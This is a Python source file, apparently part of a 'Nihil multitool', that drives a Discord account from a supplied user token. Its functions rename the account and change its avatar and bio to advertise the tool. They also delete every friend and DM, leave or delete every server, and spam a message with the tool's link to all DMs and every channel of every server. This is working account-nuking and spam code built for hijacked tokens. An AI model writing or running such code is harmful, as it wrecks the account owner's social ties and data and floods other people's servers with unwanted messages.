import subprocess
import sys
import os
import threading

# Global process reference
discord_process = None
user_token = None

NIHIL_JPG_URL = "https://raw.githubusercontent.com/igNovoline/Nihil/refs/heads/main/utils/nihil.jpg"
GITHUB_LINK = "https://github.com/igNovoline/Nihil"

def update_profile(token, username):
    """Run profile update in a subprocess"""
    script = f'''
import discord
import urllib.request
import asyncio

NIHIL_JPG_URL = "{NIHIL_JPG_URL}"
GITHUB_LINK = "{GITHUB_LINK}"

def get_image():
    try:
        with urllib.request.urlopen(NIHIL_JPG_URL) as response:
            return response.read()
    except:
        return None

async def update():
    intents = discord.Intents.default()
    intents.me = True
    client = discord.Client(intents=intents)
    
    @client.event
    async def on_ready():
        img_data = get_image()
        if img_data:
            try:
                await client.user.edit(avatar=img_data)
                print("Avatar updated")
            except:
                print("Could not update avatar")
        
        try:
            new_username = "{username} (nihil)"
            await client.user.edit(username=new_username)
            print(f"Username updated to {{new_username}}")
        except:
            print("Could not update username")
        
        try:
            bio = f"account ran by nihil multitool {{GITHUB_LINK}}"
            await client.user.edit(bio=bio)
            print("Bio updated")
        except:
            print("Could not update bio")
        
        await client.close()
    
    await client.start("{token}")

asyncio.run(update())
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    def read_output():
        for line in proc.stdout:
            print(line.rstrip())
    
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    return proc

def delete_friends(token):
    """Delete all friends"""
    script = f'''
import discord
import asyncio

intents = discord.Intents.default()
intents.relationships = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    count = 0
    for relationship in list(client.user.relationships):
        if relationship.type == discord.RelationshipType.friend:
            await relationship.delete()
            count += 1
            print(f"Deleted friend: {{relationship.name}}")
    print(f"Total friends deleted: {{count}}")
    await client.close()

asyncio.run(client.start("{token}"))
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    def read_output():
        for line in proc.stdout:
            print(line.rstrip())
    
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    return proc

def delete_dms(token):
    """Delete all DMs"""
    script = f'''
import discord
import asyncio

intents = discord.Intents.default()
intents.dm_messages = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    count = 0
    for channel in client.private_channels:
        if isinstance(channel, discord.DMChannel):
            await channel.delete()
            count += 1
            print(f"Deleted DM: {{channel.recipient}}")
    print(f"Total DMs deleted: {{count}}")
    await client.close()

asyncio.run(client.start("{token}"))
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    def read_output():
        for line in proc.stdout:
            print(line.rstrip())
    
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    return proc

def delete_servers(token):
    """Leave/delete all servers"""
    script = f'''
import discord
import asyncio

intents = discord.Intents.default()
intents.guilds = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    count = 0
    for guild in list(client.user.mutual_guilds):
        try:
            await guild.leave()
            print(f"Left server: {{guild.name}}")
            count += 1
        except:
            try:
                await guild.delete()
                print(f"Deleted server: {{guild.name}}")
                count += 1
            except:
                print(f"Could not leave/delete: {{guild.name}}")
    print(f"Total servers left/deleted: {{count}}")
    await client.close()

asyncio.run(client.start("{token}"))
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    def read_output():
        for line in proc.stdout:
            print(line.rstrip())
    
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    return proc

def send_message(token, message):
    """Send message to all DMs and all channels in all servers"""
    script = f'''
import discord
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.dm_messages = True
client = discord.Client(intents=intents)

MESSAGE = "{message} {{GITHUB_LINK}}"

@client.event
async def on_ready():
    # Send to DMs
    dm_count = 0
    for channel in client.private_channels:
        if isinstance(channel, discord.DMChannel):
            try:
                await channel.send(MESSAGE)
                dm_count += 1
                print(f"Sent DM to: {{channel.recipient}}")
            except:
                pass
    print(f"Total DMs messaged: {{dm_count}}")
    
    # Send to ALL channels in ALL servers
    server_count = 0
    channel_count = 0
    for guild in client.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(MESSAGE)
                channel_count += 1
                print(f"Sent to {{guild.name}} - {{channel.name}}")
            except:
                pass
        server_count += 1
    print(f"Total servers: {{server_count}}, Total channels messaged: {{channel_count}}")
    await client.close()

asyncio.run(client.start("{token}"))
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    def read_output():
        for line in proc.stdout:
            print(line.rstrip())
    
    t = threading.Thread(target=read_output, daemon=True)
    t.start()
    return proc

def get_username(token):
    """Get the username from token"""
    script = f'''
import discord
import asyncio

intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"USERNAME|{{client.user.name}}")
    await client.close()

asyncio.run(client.start("{token}"))
'''
    script_path = os.path.join(os.path.dirname(__file__), 'temp_discord.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    proc = subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    username = None
    for line in proc.stdout:
        if "USERNAME|" in line:
            username = line.split("|")[1].strip()
    
    proc.wait()
    return username
